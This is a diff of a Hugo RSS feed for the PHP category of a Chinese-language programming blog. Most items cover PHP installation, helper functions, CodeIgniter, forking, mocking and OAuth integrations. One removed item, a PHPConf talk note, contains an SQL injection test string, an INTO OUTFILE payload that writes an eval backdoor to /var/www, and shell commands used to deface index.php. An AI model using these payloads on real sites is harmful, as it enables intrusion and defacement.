@@ -5,12 +5,26 @@
     <link>/categories/php/</link>
     <description>Recent content in php on Software</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Fri, 06 Feb 2015 10:40:57 +0800</lastBuildDate><atom:link href="/categories/php/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language><atom:link href="/categories/php/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>PHP Basics</title>
+      <link>/posts/php-basics/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-basics/</guid>
+      <description>升級/安裝 PHP (Ubuntu) 刪除舊版本 5.0
+sudo apt-get autoremove --purge php5-* 安裝 7.0
+sudo add-apt-repository ppa:ondrej/php sudo apt-get -y update sudo apt-get install php7.0 php7.0-fpm php7.0-mysql php7.0-mcrypt php7.0-curl -y 安裝完 php 的 extension (e.g. mcrypt) 會自動幫你建立 /etc/php/7.0/mods-available/mcrypt.ini 並 link 到 /etc/php/7.0/fpm/conf.d/20-mcrypt.ini
+Optional:
+php7.0-bz2 (壓縮) php7.0-dom (xml) php7.0-mbstring (處理編碼) 檢查語法錯誤
+$ php -l test.php No syntax errors detected in test.php 啟動php shell模式
+$ php -a Interactive shell php &amp;gt; echo &amp;quot;Hello World!!&amp;quot;; Hello World!</description>
+    </item>
+    
     <item>
       <title>PHP Codeigniter S3</title>
       <link>/posts/aws-s3-php/</link>
-      <pubDate>Fri, 06 Feb 2015 10:40:57 +0800</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/posts/aws-s3-php/</guid>
       <description>(最後更新: 2016-04-27)
@@ -24,9 +38,83 @@ mobile 上傳到 s3 有兩種方法
     </item>
     
     <item>
+      <title>PHP Examples</title>
+      <link>/posts/php-examples/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-examples/</guid>
+      <description>轉換容量顯示方式 (ex: 15.31GB) function reable_size($bytes) { if ($bytes == 0) { return &#39;0 MB&#39;; } $unit = array(&#39;B&#39;, &#39;KB&#39;, &#39;MB&#39;, &#39;GB&#39;, &#39;TB&#39;, &#39;PB&#39;, &#39;EB&#39;); $show_size = $bytes / pow(1024, ($i = floor(log($bytes, 1024)))); if (intval($show_size) == $show_size) { return $show_size . &#39; &#39; . $unit[$i]; } return number_format($show_size, 2) . &#39; &#39; . $unit[$i]; } IP: function get_ip() { $inspect_type = array( &amp;quot;HTTP_CLIENT_IP&amp;quot;, &amp;quot;HTTP_X_FORWARDED_FOR&amp;quot;, &amp;quot;HTTP_X_FORWARDED&amp;quot;, &amp;quot;HTTP_X_CLUSTER_CLIENT_IP&amp;quot;, &amp;quot;HTTP_FORWARDED_FOR&amp;quot;, &amp;quot;HTTP_FORWARDED&amp;quot; ); foreach ($inspect_type as $type) { if (array_key_exists($type, $_SERVER)) { $ips = explode(&amp;quot;,&amp;quot;, $_SERVER[$type]); foreach ($ips as $ip) { if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { return $ip; } } } } return $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]; } 產生唯一字串(共32個小寫英文及數字) echo md5(uniqid(rand(), TRUE)); 產生亂數陣列(每個數字唯一，srand指定亂數產生) php &amp;gt; $a = range(0, 29); php &amp;gt; srand(333); &amp;lt;= 隨意指定隨機數字 php &amp;gt; shuffle($a); &amp;lt;= 按照隨機數字做排序 php &amp;gt; echo print_r($a); Array ( [0] =&amp;gt; 26 [1] =&amp;gt; 21 (.</description>
+    </item>
+    
+    <item>
+      <title>PHP Frameworks</title>
+      <link>/posts/php-frameworks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-frameworks/</guid>
+      <description>Codeigniter 判斷DB是否執行成功 判斷select
+if ($query-&amp;gt;result_array()) { // display data.. } return FALSE; 判斷insert
+if ($this-&amp;gt;db-&amp;gt;insert_id()) { return TRUE; } 判斷update是否成功更新
+if ($this-&amp;gt;db-&amp;gt;update(&#39;shares&#39;)) { return TRUE; } 或
+return ($this-&amp;gt;db-&amp;gt;affected_rows() &amp;gt; 0) ? TRUE : FALSE; 判斷delete是否成功刪除
+$this-&amp;gt;db-&amp;gt;delete(&#39;question_options&#39;); if ($this-&amp;gt;db-&amp;gt;affected_rows() &amp;gt; 0) { return TRUE; } return FALSE; 欄位更新 ex: +1 $this-&amp;gt;db-&amp;gt;set(&#39;lose&#39;, &#39;lose+1&#39;, FALSE); $this-&amp;gt;db-&amp;gt;where(&#39;guid&#39;, $data[&#39;guid&#39;]); $this-&amp;gt;db-&amp;gt;update(&#39;users&#39;); Form Validation 的 callback array( &#39;field&#39; =&amp;gt; &#39;current_passwd&#39;, &#39;label&#39; =&amp;gt; &#39;lang:users-current_passwd&#39;, &#39;rules&#39; =&amp;gt; &#39;trim|required|callback_check_password[13]&#39; ) function check_password($current_passwd, $uid) { // $current_passwd : CI 會自已捕捉 HTML 裡 name=&amp;quot;current_passwd&amp;quot; post 進來的值，放入第一個參數 // $uid = 13 if ( // Condition ) { return TRUE; } return FALSE; } 給 callback 的參數是從第二個參數開始給，第一個參數都是保留給自已那個欄位的值(current_passwd的值)</description>
+    </item>
+    
+    <item>
+      <title>PHP Multi-Process</title>
+      <link>/posts/php-multi-process/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-multi-process/</guid>
+      <description>Example code: echo &amp;quot;Start \n&amp;quot;; $pid = pcntl_fork(); echo &amp;quot;XD \n&amp;quot;; if ($pid) { //$rtn = pcntl_waitpid($pid, $status); echo &amp;quot;father \n&amp;quot;; $sum = 0; for ($i = 0; $i &amp;lt;= 1000000; $i++) { $sum += $i; } } else { echo &amp;quot;child \n&amp;quot;; } echo &amp;quot;End \n&amp;quot;; result :
+Start XD father XD child End End 註 :
+用 pid 判斷是主程序還是子程序 從結果可以看出 fork 出來的子程序會從 pcntl_fork() 下一行開始執行 fork 後不會等到主程序做完才做子程序, 是分時分段執行的, 也就是多程序的概念 如果要等子程序做完主程序再做的話要在主程序裡加上 $rtn = pcntl_waitpid($pid, $status); 結果為 :</description>
+    </item>
+    
+    <item>
+      <title>PHP Testing</title>
+      <link>/posts/php-testing/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-testing/</guid>
+      <description>Mock Mock global function and class method Notify.php
+&amp;lt;?php namespace Utility; class Notify { private $obj; // Parameter was passed to use as mocked object public function __construct($mockObj = NULL) { if ($mockObj != NULL) { $this-&amp;gt;obj = $mockObj; } else { $this-&amp;gt;obj = $this; } } public function doSomething($url) { $is200 = $this-&amp;gt;obj-&amp;gt;is200OK($url); $body = file_get_contents($url); return [$is200, $body]; } public function is200OK($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_exec($ch); if (!</description>
+    </item>
+    
+    <item>
+      <title>PHP Weibo Oauth</title>
+      <link>/posts/php-weibo-oauth/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-weibo-oauth/</guid>
+      <description>申請 微博申請非常的麻煩, 需要負責人的身份證件等等, 過關後才可以申請網站服務
+在申請前最好先了解 &amp;ldquo;我的應用&amp;rdquo; 及 &amp;ldquo;我的網站&amp;rdquo; 的差異, 再申請適合你網站的服務
+如果你的網站純粹只是要串接微博登入, 就選擇我的網站 我的應用是給如手機登入或是如 facebook app 那樣的去申請 申請我的網站 [1] 申請
+在開發平台頁面 點擊 管理中心 -&amp;gt; 我的網站 -&amp;gt; 添加網站 (接下來審核的步驟可以先略過) 網站名稱可以先隨便寫，而網站域名必須為已經註冊的域名 (EX : www.example.com 以下均用此 domain 當例子) 添加網站成功後，會得到 App Key 和 App Secret ，這兩個程式裡所需要的參數 [2] 網站信息 -&amp;gt; 高級信息, 在安全設置裡面，填寫網站的域名: www.example.com 及 IP: 127.0.0.1
+[3] 網站信息 -&amp;gt; 測試賬號, 設置一個管理賬號
+[4] 將域名綁定到 127.0.0.1
+因為在做 Oauth 回來後會導向你自己設定的 callback_url, 而這個 callback_url 的域名也是你在步驟 [1] 所申請的, 如果你沒有將這個域名在本機導向 127.0.0.1 的話, 就沒辦法完成剩下的步驟</description>
+    </item>
+    
+    <item>
+      <title>PHP yahoo oauth</title>
+      <link>/posts/php-yahoo-oauth/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/php-yahoo-oauth/</guid>
+      <description>申請 [1] 到Yahoo! Developer Network登入後 -&amp;gt; 右上角 My Projects -&amp;gt; Create a Project
+[2] 申請好會有一組 Application ID, Consumer Key, Consumer Secret
+[3] 填入 domain 後記得驗證它, 才能用於線上
+登入 Oauth, 並透過 yql 取得使用者資料 (使用 Codeigniter) Oauth 原先 Oauth 那邊打算使用官方的 SDK, 但是怎麼試都會有 ERROR, 於是參考網路的資源重刻了一個輪子
+YQL 原以為做登入 Oauth 取得的 GUID 再透過 YQL Console 的結果網址就可以取得使用者資料, 而不透過 YQL 的 SDK
+例如我想取得使用者資料 YQL Console 執行
+select * from social.profile where guid = &amp;quot;{我的GUID}&amp;quot; 完成後頁面下面有 url : http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20social.profile%20where%20guid%20%3D%20%22{我的GUID}%22&amp;amp;format=json&amp;amp;diagnostics=true&amp;amp;callback=</description>
+    </item>
+    
+    <item>
       <title>WeChat Oauth</title>
       <link>/posts/weixin/</link>
-      <pubDate>Sat, 16 Aug 2014 21:25:40 +0800</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/posts/weixin/</guid>
       <description>微信登入 必須先備案, 備案後去申請微信網站應用時還需要附一些公司名稱, 負責人, 章, 備案號等&amp;hellip;
@@ -44,115 +132,6 @@ PHP SDK 可參考 : http://www.cnblogs.com/xingmeng/p/3706676.html
 也就是每一次 POST 進來的值都要 check signature, 然候再處理你收到的訊息
 註 :
 用戶訊息不會在 GET 或 POST 裡, 必須要用 $GLOBALS[&amp;quot;HTTP_RAW_POST_DATA&amp;quot;] 接,</description>
-    </item>
-    
-    <item>
-      <title>PHP Multi-Process</title>
-      <link>/posts/php-multi-process/</link>
-      <pubDate>Sun, 27 Apr 2014 12:11:00 +0000</pubDate>
-      
-      <guid>/posts/php-multi-process/</guid>
-      <description>Example code: echo &amp;quot;Start \n&amp;quot;; $pid = pcntl_fork(); echo &amp;quot;XD \n&amp;quot;; if ($pid) { //$rtn = pcntl_waitpid($pid, $status); echo &amp;quot;father \n&amp;quot;; $sum = 0; for ($i = 0; $i &amp;lt;= 1000000; $i++) { $sum += $i; } } else { echo &amp;quot;child \n&amp;quot;; } echo &amp;quot;End \n&amp;quot;; result :
-Start XD father XD child End End 註 :
-用 pid 判斷是主程序還是子程序 從結果可以看出 fork 出來的子程序會從 pcntl_fork() 下一行開始執行 fork 後不會等到主程序做完才做子程序, 是分時分段執行的, 也就是多程序的概念 如果要等子程序做完主程序再做的話要在主程序裡加上 $rtn = pcntl_waitpid($pid, $status); 結果為 :</description>
-    </item>
-    
-    <item>
-      <title>PHP yahoo oauth</title>
-      <link>/posts/php-yahoo-oauth/</link>
-      <pubDate>Tue, 26 Nov 2013 22:43:00 +0000</pubDate>
-      
-      <guid>/posts/php-yahoo-oauth/</guid>
-      <description>申請 [1] 到Yahoo! Developer Network登入後 -&amp;gt; 右上角 My Projects -&amp;gt; Create a Project
-[2] 申請好會有一組 Application ID, Consumer Key, Consumer Secret
-[3] 填入 domain 後記得驗證它, 才能用於線上
-登入 Oauth, 並透過 yql 取得使用者資料 (使用 Codeigniter) Oauth 原先 Oauth 那邊打算使用官方的 SDK, 但是怎麼試都會有 ERROR, 於是參考網路的資源重刻了一個輪子
-YQL 原以為做登入 Oauth 取得的 GUID 再透過 YQL Console 的結果網址就可以取得使用者資料, 而不透過 YQL 的 SDK
-例如我想取得使用者資料 YQL Console 執行
-select * from social.profile where guid = &amp;quot;{我的GUID}&amp;quot; 完成後頁面下面有 url : http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20social.profile%20where%20guid%20%3D%20%22{我的GUID}%22&amp;amp;format=json&amp;amp;diagnostics=true&amp;amp;callback=</description>
-    </item>
-    
-    <item>
-      <title>PHP Weibo Oauth</title>
-      <link>/posts/php-weibo-oauth/</link>
-      <pubDate>Tue, 26 Nov 2013 16:23:00 +0000</pubDate>
-      
-      <guid>/posts/php-weibo-oauth/</guid>
-      <description>申請 微博申請非常的麻煩, 需要負責人的身份證件等等, 過關後才可以申請網站服務
-在申請前最好先了解 &amp;ldquo;我的應用&amp;rdquo; 及 &amp;ldquo;我的網站&amp;rdquo; 的差異, 再申請適合你網站的服務
-如果你的網站純粹只是要串接微博登入, 就選擇我的網站 我的應用是給如手機登入或是如 facebook app 那樣的去申請 申請我的網站 [1] 申請
-在開發平台頁面 點擊 管理中心 -&amp;gt; 我的網站 -&amp;gt; 添加網站 (接下來審核的步驟可以先略過) 網站名稱可以先隨便寫，而網站域名必須為已經註冊的域名 (EX : www.example.com 以下均用此 domain 當例子) 添加網站成功後，會得到 App Key 和 App Secret ，這兩個程式裡所需要的參數 [2] 網站信息 -&amp;gt; 高級信息, 在安全設置裡面，填寫網站的域名: www.example.com 及 IP: 127.0.0.1
-[3] 網站信息 -&amp;gt; 測試賬號, 設置一個管理賬號
-[4] 將域名綁定到 127.0.0.1
-因為在做 Oauth 回來後會導向你自己設定的 callback_url, 而這個 callback_url 的域名也是你在步驟 [1] 所申請的, 如果你沒有將這個域名在本機導向 127.0.0.1 的話, 就沒辦法完成剩下的步驟</description>
-    </item>
-    
-    <item>
-      <title>2013 PHPConf</title>
-      <link>/posts/phpconf-hack/</link>
-      <pubDate>Fri, 01 Nov 2013 23:03:00 +0000</pubDate>
-      
-      <guid>/posts/phpconf-hack/</guid>
-      <description>&amp;ldquo;矛盾大對決&amp;quot;是 PHPConf 的第一場 , 很不錯的開場, 而且也補足我一些防駭的觀念
-一邊防守, 一邊攻擊及解說, 實在太讚了!
-SQl Injection show.php?id=1 + &#39;
-= show.php?id=1&#39;
-如果有錯誤代表沒有做過濾 補充 : sql injection 也可以直接在密碼地方輸入 &#39; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot; -- 來測試它是否有漏洞 寫後門改首頁 show.php?id=20 into outfile &#39;/var/www/.a.php&#39; lines terminated by &#39;&amp;lt;?php eval($_POSST[cmd];?&amp;gt;&#39;
-在 /var/www 建立一個 PHP 的後門 前提是 apache 要有對資料夾執行寫檔的權限
-改首頁囉 !
-對 http://XXXX.XXX/.a.php POST, cmd的值為 :
-檢視資料清單
-echo `ls -alh` ` 包起來代表 php 會去執行 linux command
-改首頁
-echo `echo Hack by Orange &amp;gt; index.php` 使用 union 污染 sql 結果 這邊不太懂</description>
-    </item>
-    
-    <item>
-      <title>PHP Frameworks</title>
-      <link>/posts/php-frameworks/</link>
-      <pubDate>Sun, 21 Jul 2013 14:58:00 +0000</pubDate>
-      
-      <guid>/posts/php-frameworks/</guid>
-      <description>Codeigniter 判斷DB是否執行成功 判斷select
-if ($query-&amp;gt;result_array()) { // display data.. } return FALSE; 判斷insert
-if ($this-&amp;gt;db-&amp;gt;insert_id()) { return TRUE; } 判斷update是否成功更新
-if ($this-&amp;gt;db-&amp;gt;update(&#39;shares&#39;)) { return TRUE; } 或
-return ($this-&amp;gt;db-&amp;gt;affected_rows() &amp;gt; 0) ? TRUE : FALSE; 判斷delete是否成功刪除
-$this-&amp;gt;db-&amp;gt;delete(&#39;question_options&#39;); if ($this-&amp;gt;db-&amp;gt;affected_rows() &amp;gt; 0) { return TRUE; } return FALSE; 欄位更新 ex: +1 $this-&amp;gt;db-&amp;gt;set(&#39;lose&#39;, &#39;lose+1&#39;, FALSE); $this-&amp;gt;db-&amp;gt;where(&#39;guid&#39;, $data[&#39;guid&#39;]); $this-&amp;gt;db-&amp;gt;update(&#39;users&#39;); Form Validation 的 callback array( &#39;field&#39; =&amp;gt; &#39;current_passwd&#39;, &#39;label&#39; =&amp;gt; &#39;lang:users-current_passwd&#39;, &#39;rules&#39; =&amp;gt; &#39;trim|required|callback_check_password[13]&#39; ) function check_password($current_passwd, $uid) { // $current_passwd : CI 會自已捕捉 HTML 裡 name=&amp;quot;current_passwd&amp;quot; post 進來的值，放入第一個參數 // $uid = 13 if ( // Condition ) { return TRUE; } return FALSE; } 給 callback 的參數是從第二個參數開始給，第一個參數都是保留給自已那個欄位的值(current_passwd的值)</description>
-    </item>
-    
-    <item>
-      <title>PHP Examples</title>
-      <link>/posts/php-examples/</link>
-      <pubDate>Sun, 21 Jul 2013 14:35:00 +0000</pubDate>
-      
-      <guid>/posts/php-examples/</guid>
-      <description>轉換容量顯示方式 (ex: 15.31GB) function reable_size($bytes) { if ($bytes == 0) { return &#39;0 MB&#39;; } $unit = array(&#39;B&#39;, &#39;KB&#39;, &#39;MB&#39;, &#39;GB&#39;, &#39;TB&#39;, &#39;PB&#39;, &#39;EB&#39;); $show_size = $bytes / pow(1024, ($i = floor(log($bytes, 1024)))); if (intval($show_size) == $show_size) { return $show_size . &#39; &#39; . $unit[$i]; } return number_format($show_size, 2) . &#39; &#39; . $unit[$i]; } IP: function get_ip() { $inspect_type = array( &amp;quot;HTTP_CLIENT_IP&amp;quot;, &amp;quot;HTTP_X_FORWARDED_FOR&amp;quot;, &amp;quot;HTTP_X_FORWARDED&amp;quot;, &amp;quot;HTTP_X_CLUSTER_CLIENT_IP&amp;quot;, &amp;quot;HTTP_FORWARDED_FOR&amp;quot;, &amp;quot;HTTP_FORWARDED&amp;quot; ); foreach ($inspect_type as $type) { if (array_key_exists($type, $_SERVER)) { $ips = explode(&amp;quot;,&amp;quot;, $_SERVER[$type]); foreach ($ips as $ip) { if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { return $ip; } } } } return $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]; } 產生唯一字串(共32個小寫英文及數字) echo md5(uniqid(rand(), TRUE)); 產生亂數陣列(每個數字唯一，srand指定亂數產生) php &amp;gt; $a = range(0, 29); php &amp;gt; srand(333); &amp;lt;= 隨意指定隨機數字 php &amp;gt; shuffle($a); &amp;lt;= 按照隨機數字做排序 php &amp;gt; echo print_r($a); Array ( [0] =&amp;gt; 26 [1] =&amp;gt; 21 (.</description>
-    </item>
-    
-    <item>
-      <title>PHP Basics</title>
-      <link>/posts/php-basics/</link>
-      <pubDate>Thu, 07 Mar 2013 08:53:00 +0000</pubDate>
-      
-      <guid>/posts/php-basics/</guid>
-      <description>升級/安裝 PHP (Ubuntu) 刪除舊版本 5.0
-sudo apt-get autoremove --purge php5-* 安裝 7.0
-sudo add-apt-repository ppa:ondrej/php sudo apt-get -y update sudo apt-get install php7.0 php7.0-fpm php7.0-mysql php7.0-mcrypt php7.0-curl -y 安裝完 php 的 extension (e.g. mcrypt) 會自動幫你建立 /etc/php/7.0/mods-available/mcrypt.ini 並 link 到 /etc/php/7.0/fpm/conf.d/20-mcrypt.ini
-Optional:
-php7.0-bz2 (壓縮) php7.0-dom (xml) php7.0-mbstring (處理編碼) 檢查語法錯誤
-$ php -l test.php No syntax errors detected in test.php 啟動php shell模式
-$ php -a Interactive shell php &amp;gt; echo &amp;quot;Hello World!!&amp;quot;; Hello World!</description>
-    </item>
-    
-    <item>
-      <title>PHP Testing</title>
-      <link>/posts/php-testing/</link>
-      <pubDate>Thu, 07 Mar 2013 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/php-testing/</guid>
-      <description>Mock Mock global function and class method Notify.php
-&amp;lt;?php namespace Utility; class Notify { private $obj; // Parameter was passed to use as mocked object public function __construct($mockObj = NULL) { if ($mockObj != NULL) { $this-&amp;gt;obj = $mockObj; } else { $this-&amp;gt;obj = $this; } } public function doSomething($url) { $is200 = $this-&amp;gt;obj-&amp;gt;is200OK($url); $body = file_get_contents($url); return [$is200, $body]; } public function is200OK($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_exec($ch); if (!</description>
     </item>
     
   </channel>
